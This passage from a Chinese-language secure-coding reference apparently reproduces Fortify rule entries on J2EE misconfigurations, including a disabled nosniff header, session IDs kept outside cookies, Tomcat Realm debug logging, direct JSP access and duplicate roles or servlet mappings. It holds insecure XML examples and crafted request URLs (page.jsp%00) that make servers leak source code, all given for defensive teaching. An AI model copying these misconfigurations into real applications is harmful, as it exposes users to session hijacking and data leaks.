<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;http auto-config=&quot;true&quot;&gt;</span><br><span class="line"></span><br><span class="line">       ...</span><br><span class="line"></span><br><span class="line">       &lt;headers&gt;</span><br><span class="line"></span><br><span class="line">           ...</span><br><span class="line"></span><br><span class="line">           &lt;content-type-options disabled=&quot;true&quot;/&gt;</span><br><span class="line"></span><br><span class="line">       &lt;/headers&gt;</span><br><span class="line"></span><br><span class="line">&lt;/http&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-181"><a href="#RECOMMENDATIONS-181" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>为了确保应用程序不易遭受 MIME 探查的攻击，程序员可以：</p>
<p>1.在应用程序中，为所有页面全局设置 HTTP 标头 X-Content-Type-Options: nosniff。</p>
<p>2.只为可能包含用户可控内容的页面设置必要标头。</p>
<p>此标头对于防止某些攻击类至关重要，不应删除此标头或将其设置为任何其他值。</p>
<p>默认情况下，Spring Security 等框架全局均包含此标头。在这些框架中，确保不将此保护禁用。</p>
<h5 id="REFERENCES-180"><a href="#REFERENCES-180" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] OWASP OWASP List of useful HTTP headers </p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 554 </p>
<p>[3] Standards Mapping - Common Weakness Enumeration Top 25 2019 [3] CWE ID 020 </p>
<p>[4] Standards Mapping - DISA Control Correlation Identifier Version 2 CCI-002754 </p>
<p>[5] Standards Mapping - FIPS200 CM </p>
<p>[6] Standards Mapping - General Data Protection Regulation Indirect Access to Sensitive Data </p>
<p>[7] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-10 Information Input Validation (P1) </p>
<p>[8] Standards Mapping - OWASP Application Security Verification Standard 4.0 5.1.3 Input Validation Requirements, 5.1.4 Input Validation Requirements, 14.1.3 Build </p>
<p>[9] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls </p>
<p>[10] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management </p>
<p>[11] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration </p>
<p>[12] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration </p>
<p>[13] Standards Mapping - OWASP Top 10 2017 A6 Security Misconfiguration </p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10 </p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.3.1.1 </p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1 </p>
<p>[17] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1 </p>
<p>[18] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1 </p>
<p>[19] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1 </p>
<p>[20] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2.1 Requirement 6.5.1 </p>
<p>[21] Standards Mapping - Payment Card Industry Software Security Framework 1.0 Control Objective 4.2 - Critical Asset Protection </p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3510 CAT I </p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3510 CAT I </p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3510 CAT I </p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3510 CAT I </p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3510 CAT I </p>
<p>[27] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3510 CAT I </p>
<p>[28] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3510 CAT I </p>
<p>[29] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002560 CAT I </p>
<p>[30] Standards Mapping - Security Technical Implementation Guide Version 4.10 APSC-DV-002560 CAT I </p>
<p>[31] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002560 CAT I </p>
<p>[32] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002560 CAT I </p>
<p>[33] Standards Mapping - Security Technical Implementation Guide Version 4.4 APSC-DV-002560 CAT I </p>
<p>[34] Standards Mapping - Security Technical Implementation Guide Version 4.5 APSC-DV-002560 CAT I </p>
<p>[35] Standards Mapping - Security Technical Implementation Guide Version 4.6 APSC-DV-002560 CAT I </p>
<p>[36] Standards Mapping - Security Technical Implementation Guide Version 4.7 APSC-DV-002560 CAT I </p>
<p>[37] Standards Mapping - Security Technical Implementation Guide Version 4.8 APSC-DV-002560 CAT I </p>
<p>[38] Standards Mapping - Security Technical Implementation Guide Version 4.9 APSC-DV-002560 CAT I </p>
<p>[39] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15) </p>
<h4 id="J2EE-Misconfiguration-Cookies-Disabled"><a href="#J2EE-Misconfiguration-Cookies-Disabled" class="headerlink" title="J2EE Misconfiguration: Cookies Disabled"></a>J2EE Misconfiguration: Cookies Disabled</h4><h5 id="ABSTRACT-182"><a href="#ABSTRACT-182" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>程序不使用 cookie 传输会话标识符，这可能导致易受 session fixation 和 session hijacking 攻击。</p>
<h5 id="EXPLANATION-183"><a href="#EXPLANATION-183" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>大多数 Web 应用程序使用会话标识符来唯一标识用户，该标识符通常存储在 cookie 中，并在服务器和 Web 浏览器之间进行透明传输。</p>
<p>没有在 cookie 中存储会话标识符的应用程序有时将这些标识符作为 HTTP 请求参数或 URL 的一部分进行传输。接受 URL 中指定的会话标识符使得攻击者很容易进行 session fixation 攻击。</p>
<p>将会话标识符放在 URL 中还会增加针对应用程序进行 session hijacking 攻击的成功几率。当攻击者控制了受害者的活动会话或会话标识符时，就会发生 session hijacking。对于 Web 服务器、应用程序服务器和 Web 代理而言，通常的做法是存储请求的 URL。如果会话标识符包括在 URL 中，那么也会记录它们。增加能够查看和存储会话标识符的位置就会增加被攻击者攻击的机会。</p>
<h5 id="RECOMMENDATIONS-182"><a href="#RECOMMENDATIONS-182" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>使用 cookie 存储会话 ID。在 <code>&lt;Context&gt;</code> 标签中将 cookies 属性设置为 true，便可完成此配置。</p>
<h5 id="REFERENCES-181"><a href="#REFERENCES-181" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] The Context Container Apache Software Foundation</p>
<p>[2] Session Fixation Micro Focus Fortify</p>
<p>[3] Standards Mapping - Common Weakness Enumeration CWE ID 384</p>
<p>[4] Standards Mapping - FIPS200 IA</p>
<p>[5] Standards Mapping - NIST Special Publication 800-53 Revision 4 SC-23 Session Authenticity (P1)</p>
<p>[6] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M9 Improper Session Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2004 A3 Broken Authentication and Session Management</p>
<p>[8] Standards Mapping - OWASP Top 10 2007 A7 Broken Authentication and Session Management</p>
<p>[9] Standards Mapping - OWASP Top 10 2010 A3 Broken Authentication and Session Management</p>
<p>[10] Standards Mapping - OWASP Top 10 2013 A2 Broken Authentication and Session Management</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.3</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.7</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.8</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.10</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.10</p>
<p>[16] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.10</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3090 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3405 CAT I</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3405 CAT I</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3405 CAT I</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3405 CAT I</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3405 CAT I</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3405 CAT I</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002270 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002270 CAT II</p>
<p>[26] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-001620 CAT II, APSC-DV-001630 CAT II, APSC-DV-002270 CAT II</p>
<h4 id="J2EE-Misconfiguration-Debug-Information"><a href="#J2EE-Misconfiguration-Debug-Information" class="headerlink" title="J2EE Misconfiguration: Debug Information"></a>J2EE Misconfiguration: Debug Information</h4><h5 id="ABSTRACT-183"><a href="#ABSTRACT-183" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>当 Tomcat 调试级别在 3 级或以上时，可能会把敏感数据（包括密码）写入日志文件。</p>
<h5 id="EXPLANATION-184"><a href="#EXPLANATION-184" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>如果您正在使用 Tomcat 执行 authentication，Tomcat 部署描述符文件会指定一个 “Realm” 用于 authentication。如下所示：</p>
<p>示例：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;Realm className=&quot;org.apache.catalina.realm.JAASRealm&quot;</span><br><span class="line"></span><br><span class="line">       appName=&quot;SRN&quot;</span><br><span class="line"></span><br><span class="line">       userClassNames=&quot;com.srn.security.UserPrincipal&quot;</span><br><span class="line"></span><br><span class="line">       roleClassNames=&quot;com.srn.security.RolePrincipal&quot;/&gt;</span><br></pre></td></tr></table></figure>
<p>此 Realm 标签具有一个名为 debug 的属性，为可选项，用来指明日志级别。数值越大，记录的日志信息越冗长。如果调试级别设置得过高，Tomcat 会将所有的用户名和密码以明文形式写入日志文件中。Tomcat JAASRealm 的相关调试信息的临界值为 3（3 或者更高表示有问题，2 或者更低表示正常），但是这个临界值会因 Tomcat 提供的 Realm 类型的不同而有所不同。</p>
<h5 id="RECOMMENDATIONS-183"><a href="#RECOMMENDATIONS-183" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>在生产环境中请不要为 Realm 指定 debug 属性。</p>
<h5 id="REFERENCES-182"><a href="#REFERENCES-182" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Standards Mapping - Common Weakness Enumeration CWE ID 215</p>
<p>[2] Standards Mapping - FIPS200 CM</p>
<p>[3] Standards Mapping - NIST Special Publication 800-53 Revision 4 SI-11 Error Handling (P2)</p>
<p>[4] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M1 Weak Server Side Controls</p>
<p>[5] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[6] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[7] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[8] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[9] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.5</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.5</p>
<p>[15] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-002480 CAT II, APSC-DV-002570 CAT II, APSC-DV-002580 CAT II, APSC-DV-003235 CAT II</p>
<p>[25] Standards Mapping - Web Application Security Consortium 24 + 2 Information Leakage</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Information Leakage (WASC-13)</p>
<h4 id="J2EE-Misconfiguration-Direct-JSP-Access"><a href="#J2EE-Misconfiguration-Direct-JSP-Access" class="headerlink" title="J2EE Misconfiguration: Direct JSP Access"></a>J2EE Misconfiguration: Direct JSP Access</h4><h5 id="ABSTRACT-184"><a href="#ABSTRACT-184" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>直接访问 Java Server Pages 可能导致 System Information Leak、暴露源代码，甚至执行任意代码。</p>
<h5 id="EXPLANATION-185"><a href="#EXPLANATION-185" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>在使用 Web 框架（例如，使用 action 或 servlet 将请求转发给 JSP 的 Struts 和 Spring 框架）构建的应用程序中直接访问 Java Server Pages (JSP)，可能导致出现未处理的异常和系统信息泄露。使用经特殊技术处理的请求（例如 <a href="http://host/page.jsp%00" target="_blank" rel="noopener">http://host/page.jsp%00</a> 或 <a href="http://host/page.js%2570），会导致执行不力或配置不佳的应用程序服务器泄露源代码详细信息。更糟的是，如果应用程序允许用户上传任意文件，攻击者可能利用此机制通过" target="_blank" rel="noopener">http://host/page.js%2570），会导致执行不力或配置不佳的应用程序服务器泄露源代码详细信息。更糟的是，如果应用程序允许用户上传任意文件，攻击者可能利用此机制通过</a> JSP 的形式上传恶意代码并要求上传的页面在服务器上执行恶意代码。</p>
<p>例 1：以下示例显示了构造不佳的安全限制，其中明确允许使用带有 “*” 的角色名称来直接访问 JSP，这表明所有用户均可以访问相应的 Web 资源。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;JSP Access for Everyone!&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Allow any user/role access to JSP&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;*&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-184"><a href="#RECOMMENDATIONS-184" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>遵守深入防御策略并避免直接访问 JSP。</p>
<p>例 2：以下安全限制可阻止所有用户直接访问 JSP。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;JSP Access for no one!&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Disallow any user/role access to JSP&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;*.jsp&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint/&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-183"><a href="#REFERENCES-183" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Jordan Dimov JSP Security</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 497</p>
<p>[3] Standards Mapping - FIPS200 CM</p>
<p>[4] Standards Mapping - NIST Special Publication 800-53 Revision 4 AC-3 Access Enforcement (P1)</p>
<p>[5] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[6] Standards Mapping - OWASP Top 10 2004 A10 Insecure Configuration Management</p>
<p>[7] Standards Mapping - OWASP Top 10 2007 A6 Information Leakage and Improper Error Handling</p>
<p>[8] Standards Mapping - OWASP Top 10 2010 A6 Security Misconfiguration</p>
<p>[9] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[10] Standards Mapping - Payment Card Industry Data Security Standard Version 1.1 Requirement 6.5.10</p>
<p>[11] Standards Mapping - Payment Card Industry Data Security Standard Version 1.2 Requirement 6.5.6</p>
<p>[12] Standards Mapping - Payment Card Industry Data Security Standard Version 2.0 Requirement 6.5.1, Requirement 6.5.5</p>
<p>[13] Standards Mapping - Payment Card Industry Data Security Standard Version 3.0 Requirement 6.5.1, Requirement 6.5.5</p>
<p>[14] Standards Mapping - Payment Card Industry Data Security Standard Version 3.1 Requirement 6.5.1, Requirement 6.5.5</p>
<p>[15] Standards Mapping - Payment Card Industry Data Security Standard Version 3.2 Requirement 6.5.1, Requirement 6.5.5</p>
<p>[16] Standards Mapping - Security Technical Implementation Guide Version 3.1 APP3620 CAT II</p>
<p>[17] Standards Mapping - Security Technical Implementation Guide Version 3.10 APP3620 CAT II</p>
<p>[18] Standards Mapping - Security Technical Implementation Guide Version 3.4 APP3620 CAT II</p>
<p>[19] Standards Mapping - Security Technical Implementation Guide Version 3.5 APP3620 CAT II</p>
<p>[20] Standards Mapping - Security Technical Implementation Guide Version 3.6 APP3620 CAT II</p>
<p>[21] Standards Mapping - Security Technical Implementation Guide Version 3.7 APP3620 CAT II</p>
<p>[22] Standards Mapping - Security Technical Implementation Guide Version 3.9 APP3620 CAT II</p>
<p>[23] Standards Mapping - Security Technical Implementation Guide Version 4.1 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[24] Standards Mapping - Security Technical Implementation Guide Version 4.2 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[25] Standards Mapping - Security Technical Implementation Guide Version 4.3 APSC-DV-000460 CAT I, APSC-DV-000470 CAT II</p>
<p>[26] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="J2EE-Misconfiguration-Duplicate-Security-Role"><a href="#J2EE-Misconfiguration-Duplicate-Security-Role" class="headerlink" title="J2EE Misconfiguration: Duplicate Security Role"></a>J2EE Misconfiguration: Duplicate Security Role</h4><h5 id="ABSTRACT-185"><a href="#ABSTRACT-185" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>采用相同名称的多个安全角色已存在。重复的安全角色通常表示存在 Leftover Debug Code 或排字错误。</p>
<h5 id="EXPLANATION-186"><a href="#EXPLANATION-186" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>重复的安全角色毫无用处，因为只会应用指定安全角色的最后一个定义。</p>
<p>例 1： web.xml 文件中的条目定义了两个 admin 角色。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;AdminPage&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Admin only pages&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/auth/noaccess/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Administrators only&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;security-role&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Administrator&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-role&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;security-role&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Non-Administrator&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-role&gt;</span><br></pre></td></tr></table></figure>
<h5 id="RECOMMENDATIONS-185"><a href="#RECOMMENDATIONS-185" class="headerlink" title="RECOMMENDATIONS"></a>RECOMMENDATIONS</h5><p>请不要为单个角色名称定义重复的安全角色。</p>
<p>例 2： web.xml 文件中的以下条目定义了两个截然不同的角色。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">&lt;security-constraint&gt;</span><br><span class="line"></span><br><span class="line">    &lt;web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">        &lt;web-resource-name&gt;AdminPage&lt;/web-resource-name&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Admin only pages&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;url-pattern&gt;/auth/noaccess/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/web-resource-collection&gt;</span><br><span class="line"></span><br><span class="line">    &lt;auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">        &lt;description&gt;Administrators only&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">        &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;/auth-constraint&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-constraint&gt;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">&lt;security-role&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Administrator&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role-name&gt;admin&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-role&gt;</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line">&lt;security-role&gt;</span><br><span class="line"></span><br><span class="line">    &lt;description&gt;Non-Administrator&lt;/description&gt;</span><br><span class="line"></span><br><span class="line">    &lt;role-name&gt;user&lt;/role-name&gt;</span><br><span class="line"></span><br><span class="line">&lt;/security-role&gt;</span><br></pre></td></tr></table></figure>
<h5 id="REFERENCES-184"><a href="#REFERENCES-184" class="headerlink" title="REFERENCES"></a>REFERENCES</h5><p>[1] Sun Microsystems, Inc. Java Servlet Specification 2.4</p>
<p>[2] Standards Mapping - Common Weakness Enumeration CWE ID 398</p>
<p>[3] Standards Mapping - OWASP Mobile Top 10 Risks 2014 M5 Poor Authorization and Authentication</p>
<p>[4] Standards Mapping - OWASP Top 10 2013 A5 Security Misconfiguration</p>
<p>[5] Standards Mapping - Web Application Security Consortium Version 2.00 Application Misconfiguration (WASC-15)</p>
<h4 id="J2EE-Misconfiguration-Duplicate-Servlet-Mapping"><a href="#J2EE-Misconfiguration-Duplicate-Servlet-Mapping" class="headerlink" title="J2EE Misconfiguration: Duplicate Servlet Mapping"></a>J2EE Misconfiguration: Duplicate Servlet Mapping</h4><h5 id="ABSTRACT-186"><a href="#ABSTRACT-186" class="headerlink" title="ABSTRACT"></a>ABSTRACT</h5><p>存在使用相同 URL 模式的多个 servlet 映射。重复的 servlet 映射通常表示存在 Leftover Debug Code 或排字错误。</p>
<h5 id="EXPLANATION-187"><a href="#EXPLANATION-187" class="headerlink" title="EXPLANATION"></a>EXPLANATION</h5><p>重复的 servlet 映射毫无用处，因为当多个 servlet 映射使用相同 URL 模式时，仅应用最后一个条目。</p>
<p>例 1：在以下示例中，两个不同的 servlet 映射使用了相同的 URL 模式 /servletA/*。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;ServletA&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/servletA/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">&lt;servlet-mapping&gt;</span><br><span class="line"></span><br><span class="line">    &lt;servlet-name&gt;ServletB&lt;/servlet-name&gt;</span><br><span class="line"></span><br><span class="line">    &lt;url-pattern&gt;/servletA/*&lt;/url-pattern&gt;</span><br><span class="line"></span><br><span class="line">&lt;/servlet-mapping&gt;</span><br></pre></td></tr></table></figure>
